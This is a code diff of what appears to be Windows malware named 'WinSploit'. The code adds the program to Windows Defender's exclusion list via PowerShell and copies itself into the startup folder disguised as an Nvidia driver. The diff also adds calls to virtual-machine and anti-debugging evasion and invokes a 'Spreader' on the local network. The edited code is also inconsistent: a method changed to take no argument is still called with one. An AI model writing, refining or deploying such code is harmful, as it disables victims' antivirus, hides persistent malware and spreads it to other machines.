@@ -24,22 +24,17 @@ import ctypes
 
 
 class WinSploit:
-    def DefenderBypass(self, exe_path):
+    def DefenderBypass(self):
         try:
-            exe_path2 = os.path.abspath(sys.argv[0])
+            exe_path = os.path.abspath(sys.argv[0])  # Use the current script's path directly
             ps_command = f"Add-MpPreference -ExclusionPath '{exe_path}'"
-            ps_command2 = f"Add-MpPreference -ExclusionPath '{exe_path2}'"
             result = subprocess.run(["powershell", "-Command", ps_command], capture_output=True, text=True)
-            result2 = subprocess.run(["powershell", "-Command", ps_command2], capture_output=True, text=True)
             if result.returncode == 0:
-                return f"Erfolgreich zur Ausnahme hinzugefügt: {exe_path}"
-            elif result2.returncode == 0:
-                return None
+                return "Bypassed"
             else:
-                return f"Hinzufügen zur Ausnahme fehlgeschlagen: {result.stderr.strip()}"
+                return "Failed"
         except Exception as e:
-            return f"Ein Fehler ist aufgetreten: {e}"
-
+            return e
 
     def autostart(self):
         try:
@@ -48,9 +43,10 @@ class WinSploit:
             random_name = f"NvidiaDriver_{uuid.uuid4()}.exe"
             destination_path = os.path.join(autostart_folder, random_name)
             shutil.copyfile(exe_path, destination_path)
-            bypass_result = self.DefenderBypass(destination_path)
+            # Add the random name to the Defender exclusion
+            self.DefenderBypass(destination_path)
         except Exception as e:
-            return f"Ein Fehler ist aufgetreten: {e}"
+            return e
 
     def BypassVM(self): # Try to detect if system is running in a virtual debugging env
         if platform.system() == "Windows":
@@ -246,5 +242,7 @@ if __name__ == '__main__':
     win_sploit = WinSploit()
     win_sploit.autostart()
     win_sploit.DefenderBypass()
+    win_sploit.BypassVM()
+    win_sploit.AntiDebugging()
     ip = Spreader.get_local_ip()
     spread = Spreader(ip)
